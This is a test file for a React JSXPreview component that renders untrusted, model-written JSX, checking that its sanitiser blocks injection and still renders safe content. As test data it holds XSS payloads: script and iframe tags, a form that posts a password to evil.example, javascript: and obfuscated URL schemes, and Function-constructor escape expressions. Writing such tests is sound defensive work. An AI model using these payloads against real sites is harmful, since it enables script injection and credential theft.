// @vitest-environment happy-dom
/**
 * JSXPreview renders a JSX string a model wrote, inside the host app's page.
 *
 * That string is untrusted. Anything it can make the browser execute or load
 * as a document runs with the host's origin, so the preview renders only an
 * allowlist of presentational tags, keeps only safe URL schemes, drops the
 * attributes that inject markup, and refuses expressions that could reach a
 * constructor. The `<script>` and event-handler cases pin the parser's own
 * defaults; every other payload rendered or ran before. The safe-content
 * cases keep the filter from passing by rendering nothing.
 *
 * The error banner is derived from the input, not pushed from a child's
 * render: a parse failure must show, must clear once the JSX parses again,
 * and must keep the last good render on screen while it lasts.
 *
 * Renders registry source, which imports shadcn helpers through `@/`; the
 * vitest config aliases those to Storybook's stubs.
 */
import { cleanup, render } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { JSXPreview, JSXPreviewContent, JSXPreviewError } from "../../registry/components/jsx-preview";

afterEach(cleanup);

function Preview(props: { jsx: string; isStreaming?: boolean; components?: Record<string, React.ComponentType<any>>; bindings?: Record<string, unknown>; onError?: (e: Error) => void }) {
  return (
    <JSXPreview {...props}>
      <JSXPreviewContent />
      <JSXPreviewError />
    </JSXPreview>
  );
}

describe("untrusted JSX cannot execute or embed content", () => {
  // [what, selector that must not match, payload]
  const blockedTags: Array<[string, string, string]> = [
    ["script", "script", `<script>alert(1)</script>`],
    ["iframe", "iframe", `<iframe src="https://evil.example" />`],
    ["iframe srcDoc", "iframe", `<iframe srcDoc="<script>alert(1)</script>" />`],
    ["object", "object", `<object data="https://evil.example/x.swf" />`],
    ["embed", "embed", `<embed src="https://evil.example/x.swf" />`],
    ["style", "style", `<style>{"body{display:none}"}</style>`],
    ["link", "link", `<link rel="stylesheet" href="https://evil.example/x.css" />`],
    ["meta refresh", "meta", `<meta httpEquiv="refresh" content="0;url=https://evil.example" />`],
    ["base", "base", `<base href="https://evil.example/" />`],
    ["title", "title", `<title>Sign in again</title>`],
    ["form", "form", `<form action="https://evil.example/steal"><input name="password" /></form>`],
    ["svg animate", "svg > *", `<svg><animate attributeName="href" to="javascript:alert(1)" /></svg>`],
    ["svg foreignObject", "svg > *", `<svg><foreignObject><div>x</div></foreignObject></svg>`],
  ];

  it.each(blockedTags)("drops <%s>", (_label, selector, jsx) => {
    render(<Preview jsx={`<div>${jsx}</div>`} />);
    // The whole document: React hoists some tags (meta, link, title) out of the container into <head>.
    expect(document.querySelector(selector)).toBeNull();
  });

  it("drops event-handler attributes", () => {
    const { container } = render(<Preview jsx={`<img src="/a.png" onError="alert(1)" onLoad={() => 1} />`} />);
    const img = container.querySelector("img")!;
    expect(img).not.toBeNull();
    expect([...img.attributes].map((a) => a.name).filter((n) => /^on/i.test(n))).toEqual([]);
  });

  it("drops dangerouslySetInnerHTML, so it cannot smuggle markup in", () => {
    const { container } = render(
      <Preview jsx={`<div dangerouslySetInnerHTML={{ __html: '<img src="x" onerror="alert(1)">' }} />`} />,
    );
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("onerror");
  });

  const blockedUrls: Array<[string, string]> = [
    ["javascript:", `<a href="javascript:alert(1)">x</a>`],
    ["mixed-case javascript:", `<a href="JaVaScRiPt:alert(1)">x</a>`],
    ["javascript: split by a tab", `<a href="java\tscript:alert(1)">x</a>`],
    ["javascript: behind leading spaces", `<a href="  javascript:alert(1)">x</a>`],
    ["javascript: on an upper-case attribute name", `<a HREF="javascript:alert(1)">x</a>`],
    ["data:text/html", `<a href="data:text/html,<script>alert(1)</script>">x</a>`],
    ["vbscript:", `<a href="vbscript:msgbox(1)">x</a>`],
  ];

  it.each(blockedUrls)("drops a %s link target", (_label, jsx) => {
    const { container } = render(<Preview jsx={jsx} />);
    const a = container.querySelector("a")!;
    expect(a).not.toBeNull();
    expect(a.hasAttribute("href")).toBe(false);
  });

  it("drops a javascript: image source", () => {
    const { container } = render(<Preview jsx={`<img src="javascript:alert(1)" alt="x" />`} />);
    const img = container.querySelector("img")!;
    expect(img.hasAttribute("src")).toBe(false);
    expect(img.getAttribute("alt")).toBe("x");
  });

  it("drops a javascript: target reached through a spread binding", () => {
    const { container } = render(
      <Preview jsx={`<a {...link}>x</a>`} bindings={{ link: { href: "javascript:alert(1)", title: "t" } }} />,
    );
    const a = container.querySelector("a")!;
    expect(a.hasAttribute("href")).toBe(false);
    expect(a.getAttribute("title")).toBe("t");
  });
});

describe("untrusted JSX cannot run script through an expression", () => {
  // The parser evaluates `{...}`. Each payload walks from a literal to the
  // Function constructor and calls what it builds; the marker proves it ran.
  const payloads: Array<[string, string]> = [
    ["a string's constructor", `{"".constructor.constructor("globalThis.__fsdPwned = 1")()}`],
    ["an arrow function's constructor", `{(() => 0).constructor("globalThis.__fsdPwned = 1")()}`],
    ["a key spelled at runtime", `{[]["const" + "ructor"]["const" + "ructor"]("globalThis.__fsdPwned = 1")()}`],
    ["a key in a template literal", "{[][`constructor`][`constructor`](\"globalThis.__fsdPwned = 1\")()}"],
    ["a unicode-escaped name", `{"".\\u0063onstructor.\\u0063onstructor("globalThis.__fsdPwned = 1")()}`],
  ];

  beforeEach(() => {
    (globalThis as Record<string, unknown>).__fsdPwned = 0;
  });

  it.each(payloads)("does not run code reached through %s", (_label, expr) => {
    const { container } = render(<Preview jsx={`<div>${expr}</div>`} />);
    expect((globalThis as Record<string, unknown>).__fsdPwned).toBe(0);
    expect(container.querySelector(".text-destructive")?.textContent).toMatch(/not allowed|unexpected/i);
  });

  it("does not crash on a tag named after an Object.prototype member", () => {
    const { container } = render(<Preview jsx={`<div>a<constructor />b</div>`} />);
    expect(container.querySelector(".text-destructive")).not.toBeNull();
  });
});

describe("safe content still renders", () => {
  it("keeps ordinary expressions: style objects, maps over bindings, literal indexes, ternaries", () => {
    const { container } = render(
      <Preview
        jsx={`<ul style={{ color: "red" }}>{items.map((item) => <li key={item}>{item}</li>)}<li>{items[0]}</li><li>{items.length > 1 ? "many" : "one"}</li></ul>`}
        bindings={{ items: ["a", "b"] }}
      />,
    );
    expect(container.querySelector("ul")?.getAttribute("style")).toContain("red");
    expect([...container.querySelectorAll("li")].map((li) => li.textContent)).toEqual(["a", "b", "a", "many"]);
  });

  it("renders HTML-style void tags left unclosed", () => {
    const { container } = render(<Preview jsx={`<p>one<br>two<img src="/a.png" alt="a"></p>`} />);
    expect(container.querySelector("p br")).not.toBeNull();
    expect(container.querySelector("p img")?.getAttribute("src")).toBe("/a.png");
    expect(container.querySelector(".text-destructive")).toBeNull();
  });

  it("keeps presentational tags, safe links, and relative sources", () => {
    const { container } = render(
      <Preview
        jsx={`<div className="card"><h2>Title</h2><p>Hi <strong>there</strong></p><a href="https://example.com/x">web</a><a href="/docs">rel</a><a href="#top">frag</a><a href="mailto:a@b.co">mail</a><img src="/a.png" alt="a" /><ul><li>one</li></ul><svg viewBox="0 0 10 10"><path d="M0 0L10 10" /></svg></div>`}
      />,
    );
    expect(container.querySelector("div.card h2")?.textContent).toBe("Title");
    expect(container.querySelector("strong")?.textContent).toBe("there");
    expect([...container.querySelectorAll("a")].map((a) => a.getAttribute("href"))).toEqual([
      "https://example.com/x",
      "/docs",
      "#top",
      "mailto:a@b.co",
    ]);
    expect(container.querySelector("img")?.getAttribute("src")).toBe("/a.png");
    expect(container.querySelector("li")?.textContent).toBe("one");
    expect(container.querySelector("svg path")?.getAttribute("d")).toBe("M0 0L10 10");
  });

  it("renders host-supplied components with their props", () => {
    const Badge = ({ label }: { label: string }) => <span data-testid="badge">{label}</span>;
    const { getByTestId } = render(<Preview jsx={`<Badge label="ok" />`} components={{ Badge }} />);
    expect(getByTestId("badge").textContent).toBe("ok");
  });
});

describe("the error banner is derived from the input", () => {
  let consoleError: ReturnType<typeof vi.spyOn>;
  beforeEach(() => {
    consoleError = vi.spyOn(console, "error").mockImplementation(() => {});
  });
  afterEach(() => consoleError.mockRestore());

  const broken = `<div className=>oops</div>`;

  it("shows a parse error without updating state during another component's render", () => {
    const onError = vi.fn();
    const { container } = render(<Preview jsx={broken} onError={onError} />);
    expect(container.textContent).toMatch(/unexpected|error/i);
    expect(onError).toHaveBeenCalledTimes(1);
    const messages = consoleError.mock.calls.map((args) => String(args[0]));
    expect(messages.filter((m) => /Cannot update a component|while rendering a different component/.test(m))).toEqual([]);
  });

  it("clears the error once the JSX parses again", () => {
    const { container, rerender } = render(<Preview jsx={broken} />);
    expect(container.querySelector(".text-destructive")).not.toBeNull();
    rerender(<Preview jsx={`<p>fixed</p>`} />);
    expect(container.querySelector(".text-destructive")).toBeNull();
    expect(container.querySelector("p")?.textContent).toBe("fixed");
  });

  it("keeps the last good render on screen while a later chunk fails to parse", () => {
    const { container, rerender } = render(<Preview jsx={`<p>first</p>`} isStreaming />);
    expect(container.querySelector("p")?.textContent).toBe("first");
    rerender(<Preview jsx={`<p>first</p><div className=`} isStreaming />);
    expect(container.querySelector("p")?.textContent).toBe("first");
  });
});
